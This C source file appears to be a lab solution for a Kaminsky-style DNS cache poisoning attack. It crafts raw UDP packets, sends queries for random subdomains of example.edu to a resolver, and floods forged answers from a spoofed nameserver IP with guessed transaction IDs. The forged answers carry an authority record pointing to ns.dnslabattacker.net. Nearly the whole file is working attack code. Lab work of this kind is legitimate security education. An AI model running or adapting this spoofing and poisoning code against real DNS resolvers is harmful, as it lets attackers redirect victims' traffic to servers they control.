#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

        int i;
        int gap;
        const u_char *ch;

        /* offset */
        printf("%05d   ", offset);

        /* hex */
        ch = payload;
        for(i = 0; i < len; i++) {
                printf("%02x ", *ch);
                ch++;
                /* print extra space after 8th byte for visual aid */
                if (i == 7)
                        printf(" ");
        }
        /* print space to handle line less than 8 bytes */
        if (len < 8)
                printf(" ");

        /* fill hex gap with spaces if not full line */
        if (len < 16) {
                gap = 16 - len;
                for (i = 0; i < gap; i++) {
                        printf("   ");
                }
        }
        printf("   ");

        /* ascii (if printable) */
        ch = payload;
        for(i = 0; i < len; i++) {
                if (isprint(*ch))
                        printf("%c", *ch);
                else
                        printf(".");
                ch++;
        }

        printf("\n");

return;
}



void
print_payload(const u_char *payload, int len)
{

        int len_rem = len;
        int line_width = 16;                    /* number of bytes per line */
        int line_len;
        int offset = 0;                                 /* zero-based offset counter */
        const u_char *ch = payload;

        if (len <= 0)
                return;

        /* data fits on one line */
        if (len <= line_width) {
                print_hex_ascii_line(ch, len, offset);
                return;
        }

        /* data spans multiple lines */
        for ( ;; ) {
                /* compute current line length */
                line_len = line_width % len_rem;
                /* print line */
                print_hex_ascii_line(ch, line_len, offset);
                /* compute total remaining */
                len_rem = len_rem - line_len;
                /* shift pointer to remaining bytes to print */
                ch = ch + line_len;
                /* add offset */
                offset = offset + line_width;
                /* check if we have line width chars or less */
                if (len_rem <= line_width) {
                        /* print last line and get out */
                        print_hex_ascii_line(ch, len_rem, offset);
                        break;
                }
        }

return;
}





// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)
struct answer_str{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int data_length;
};


unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void make_response(char *url,char *attacker, char *dns_s, char *example){
    int sd;

    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
   ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    dns->flags=htons(FLAG_R);

    //only 1 query, so the count should be one.
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = htons(1);
    //query string
    strcpy(data, url);
    int length= strlen(data)+ 1;
    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);
    
    int offset = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd);
    //response packet Answer 
    buffer[offset] = 0xc0;
    buffer[offset + 1] = 0x0c;

    buffer[offset + 2] = 0x00;
    buffer[offset + 3] = 0x01;

    buffer[offset + 4] = 0x00;
    buffer[offset + 5] = 0x01;

    buffer[offset + 6] = 0x02;
    buffer[offset + 7] = 0x00;
    buffer[offset + 8] = 0x00;
    buffer[offset + 9] = 0x00;

    buffer[offset + 10] = 0x00;
    buffer[offset + 11] = 0x04;

    buffer[offset + 12] = 0x01;
    buffer[offset + 13] = 0x01;
    buffer[offset + 14] = 0x01;
    buffer[offset + 15] = 0x01;

    //authoritative

    buffer[offset + 16] = 0xc0;
    buffer[offset + 17] = 0x12;

    buffer[offset + 18] = 0x00;
    buffer[offset + 19] = 0x02;

    buffer[offset + 20] = 0x00;
    buffer[offset + 21] = 0x01;

    buffer[offset + 22] = 0x02;
    buffer[offset + 23] = 0x00;
    buffer[offset + 24] = 0x00;
    buffer[offset + 25] = 0x00;

    buffer[offset + 26] = 0x00;
    buffer[offset + 27] = 0x17;

    buffer[offset + 28] = 0x02;
    buffer[offset + 29] = 0x6e;
    buffer[offset + 30] = 0x73;
    buffer[offset + 31] = 0x0e;
    buffer[offset + 32] = 0x64;
    buffer[offset + 33] = 0x6e;
    buffer[offset + 34] = 0x73;
    buffer[offset + 35] = 0x6c;
    buffer[offset + 36] = 0x61;
    buffer[offset + 37] = 0x62;
    buffer[offset + 38] = 0x61;
    buffer[offset + 39] = 0x74;
    buffer[offset + 40] = 0x74;
    buffer[offset + 41] = 0x61;
    buffer[offset + 42] = 0x63;
    buffer[offset + 43] = 0x6b;
    buffer[offset + 44] = 0x65;
    buffer[offset + 45] = 0x72;
    buffer[offset + 46] = 0x03;
    buffer[offset + 47] = 0x6e;
    buffer[offset + 48] = 0x65;
    buffer[offset + 49] = 0x74;
    buffer[offset + 50] = 0x00;

    //additional
    buffer[offset + 51] = 0x02;
    buffer[offset + 52] = 0x6e;
    buffer[offset + 53] = 0x73;
    buffer[offset + 54] = 0x0e;
    buffer[offset + 55] = 0x64;
    buffer[offset + 56] = 0x6e;
    buffer[offset + 57] = 0x73;
    buffer[offset + 58] = 0x6c;
    buffer[offset + 59] = 0x61;
    buffer[offset + 60] = 0x62;
    buffer[offset + 61] = 0x61;
    buffer[offset + 62] = 0x74;
    buffer[offset + 63] = 0x74;
    buffer[offset + 64] = 0x61;
    buffer[offset + 65] = 0x63;
    buffer[offset + 66] = 0x6b;
    buffer[offset + 67] = 0x65;
    buffer[offset + 68] = 0x72;
    buffer[offset + 69] = 0x03;
    buffer[offset + 70] = 0x6e;
    buffer[offset + 71] = 0x65;
    buffer[offset + 72] = 0x74;
    buffer[offset + 73] = 0x00;
  
    buffer[offset + 74] = 0x00;
    buffer[offset + 75] = 0x01;
   
    buffer[offset + 76] = 0x00;
    buffer[offset + 77] = 0x01; 

    buffer[offset + 78] = 0x02;
    buffer[offset + 79] = 0x00;
    buffer[offset + 80] = 0x00;
    buffer[offset + 81] = 0x00;

    buffer[offset + 82] = 0x00;
    buffer[offset + 83] = 0x04;

    buffer[offset + 84] = 0x01;
    buffer[offset + 85] = 0x01;
    buffer[offset + 86] = 0x01;
    buffer[offset + 87] = 0x01;
    
    //second session
    buffer[offset + 88] = 0x00;
    buffer[offset + 89] = 0x00;
    buffer[offset + 90] = 0x29;
    buffer[offset + 91] = 0x10;
    buffer[offset + 92] = 0x00;
    buffer[offset + 93] = 0x00;
    buffer[offset + 94] = 0x00;
    buffer[offset + 95] = 0x88;
    buffer[offset + 96] = 0x00;
    buffer[offset + 97] = 0x00;
    buffer[offset + 98] = 0x00;

 


    

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd<0) // if socket fails to be created
        printf("socket error\n");


    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    // IP addresses
    sin.sin_addr.s_addr = inet_addr(dns_s); 
    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + 
    sizeof(struct dataEnd) + length + 99; // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    //????
    ip->iph_sourceip = inet_addr("199.43.133.53");
    // The destination IP address
    ip->iph_destip = inet_addr(dns_s);
    udp->udph_srcport = htons(53);  // source port number. remember the lower number may be reserved

    // Destination port number
    udp->udph_destport = htons(33333);

    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)
    + 99);
    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
        printf("error\n");
        exit(-1);
    }
    int trans_id = 3500;
    int count = 0;
    while(count < 100)
    {   
        dns->query_id = trans_id + count;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
            printf("packet send error %d which means %s\n", errno, strerror(errno));
	    }
	count++;
    }
   

    close(sd);
    
}






int main(int argc, char *argv[])
{
    // This is to check the argc number
    //if(argc != 3){
       // printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
       // exit(-1);
   // }
    char *dns_s = "192.168.15.4";
    char *example = "199.43.135.53";
    char *attacker = "192.168.15.6";
    // socket descriptor
    int sd;

    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/
    
    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error in sending query\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(dns_s); // this is the second argument we input into the program
    
    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(attacker);

    // The destination IP address
    ip->iph_destip = inet_addr(dns_s);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }
    while(1)
    {	
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
            printf("packet send error %d which means %s\n",errno,strerror(errno));}
        sleep(0.9);
    	make_response(data,attacker,dns_s,example);
	}
    close(sd);
    return 0;
}

